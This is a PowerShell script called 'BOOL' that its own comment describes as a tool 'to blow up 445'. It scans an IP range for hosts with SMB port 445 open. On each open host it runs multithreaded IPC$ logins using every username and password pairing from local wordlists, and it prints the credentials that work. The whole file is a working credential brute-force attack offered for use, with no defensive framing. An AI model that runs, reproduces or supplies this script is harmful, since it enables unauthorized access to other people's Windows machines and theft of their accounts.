<#
*********BOOL*********
This script is used to blow up 445
Create user.txt and pass.txt under the directory of the script
StartIP:127.0.0.1
StopIP:127.0.0.254
#>
function Bool {
            
    Param(
       [parameter(Mandatory = $true, Position = 0)]
       [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
       [string]
       $StartIP,
       [parameter(Mandatory = $true, Position = 1)]
       [ValidatePattern("\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")]
       [string]
       $StopIP,
       [Parameter(Mandatory=$false)]
       [int]
       $Port=445,
       [Parameter(Mandatory=$false)]
       [int]
       $timeout=1000
           )
   
   function clients([string]$StartIP,[string]$StopIP,[int]$port,$timeout){
   foreach($a in ($StartIP.Split(".")[0]..$StopIP.Split(".")[0])) {
       foreach($b in ($StartIP.Split(".")[1]..$StopIP.Split(".")[1])) {
           foreach($c in ($StartIP.Split(".")[2]..$StopIP.Split(".")[2])) {
               foreach($d in ($StartIP.Split(".")[3]..$StopIP.Split(".")[3])) {
                    $client = New-Object System.Net.Sockets.TcpClient
                    $ports = $client.BeginConnect("$a.$b.$c.$d", $port,$null,$null) 
                    $wait = $ports.AsyncWaitHandle.WaitOne($timeout,$false)
                   $ips="$a.$b.$c.$d"
                    if($wait){
                    
                     Write-Output "`n [+]The:$ips Open:445"
                     $throttleLimit = 10
                     $Pool = [RunspaceFactory]::CreateRunspacePool(1, $throttleLimit)
                     $Pool.Open()
                     $user=Get-Content -Path user.txt -ErrorAction "SilentlyContinue" 
                     $pass=Get-Content -Path pass.txt -ErrorAction "SilentlyContinue" 
                     $threads=@()
                     $ScriptBlock = {
                     Param ($ips,$user,$pass)
                      net use \\$ips\ipc$ $pass /user:$user 2>$null 
                     if (( net use \\$ips\ipc$ $pass /user:$user 2>$null) -ne $null){
                        "`n[+]ip:$ips,username:$user,password:$pass" 
                        & net use \\$ips\ipc$ /del | Out-Null
                     }
                     }
                     $lenth=$user.Length
                     $lenthpass=$pass.Length
                     $handles =for ($u=0;$u-le $lenth-1;$u++) { 
                     for ($j=0;$j -le $lenthpass-1;$j++){
                     $powershell = [powershell]::Create().AddScript($ScriptBlock).AddArgument($ips).AddArgument($user[$u]).AddArgument($pass[$j])
                     $powershell.RunspacePool = $Pool
                     $powershell.BeginInvoke()
                     $threads +=$powershell
                     }
                     }

                     do {
                         $i = 0
                         $done = $true
                         foreach ($handle in $handles) {
                           if ($handle -ne $null) {
                             if ($handle.IsCompleted) {
                               $threads[$i].EndInvoke($handle)
                               $threads[$i].Dispose()
                               $handles[$i] = $null
                             } else {
                               $done = $false
                             }
                           }
                           $i++
                           
                         }
                         if (-not $done) {Write-Host "." -NoNewline
                            Start-Sleep -Milliseconds 2000 
                           }
                       } until ($done)      
                   $client.Close() }
                   else {
                    $client.Close()
                    Write-Output "`n [-]The:$ips NotOpen:445"
                   }
               }
           }
       }
   }
}
   
   function main () {
           Write-Output "*********BOOL*********"
           clients $StartIP $StopIP $Port $timeout	
   }
main
}
Bool